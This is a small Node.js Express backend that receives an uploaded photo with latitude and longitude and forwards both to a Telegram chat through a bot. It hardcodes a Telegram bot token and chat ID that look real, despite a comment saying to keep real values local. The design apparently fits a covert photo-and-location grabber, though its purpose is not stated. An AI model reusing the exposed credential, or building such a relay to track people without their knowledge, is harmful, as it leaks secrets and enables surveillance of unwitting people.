const express = require("express");
const multer = require("multer");
const cors = require("cors");
const { fetch, FormData } = require("undici");

const app = express();
app.use(cors());

const upload = multer({ storage: multer.memoryStorage() });

// 🔐 PUT YOUR REAL VALUES LOCALLY
const BOT_TOKEN = "8595589382:AAFBQLaKCq8FTfN8HYg2KB9iYhbL4sV6s4c";
const CHAT_ID = "8522367236";

app.get("/", (req, res) => {
  res.send("Backend alive");
});

app.post("/submit", upload.single("photo"), async (req, res) => {
  try {
    console.log("➡️ /submit HIT");

    console.log("Body:", req.body);
    console.log("File exists:", !!req.file);

    if (!req.file) {
      console.log("❌ NO FILE RECEIVED");
      return res.status(400).send("No photo");
    }

    console.log("✅ FILE SIZE:", req.file.size);

    const { latitude, longitude } = req.body;

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", new Blob([req.file.buffer]), "photo.jpg");
    form.append(
      "caption",
      `📍 Location\nLat: ${latitude}\nLng: ${longitude}`
    );

    const tgRes = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      { method: "POST", body: form }
    );

    console.log("📨 Telegram status:", tgRes.status);

    res.send("OK");
  } catch (err) {
    console.error("🔥 ERROR:", err);
    res.status(500).send("FAIL");
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on", PORT);
});
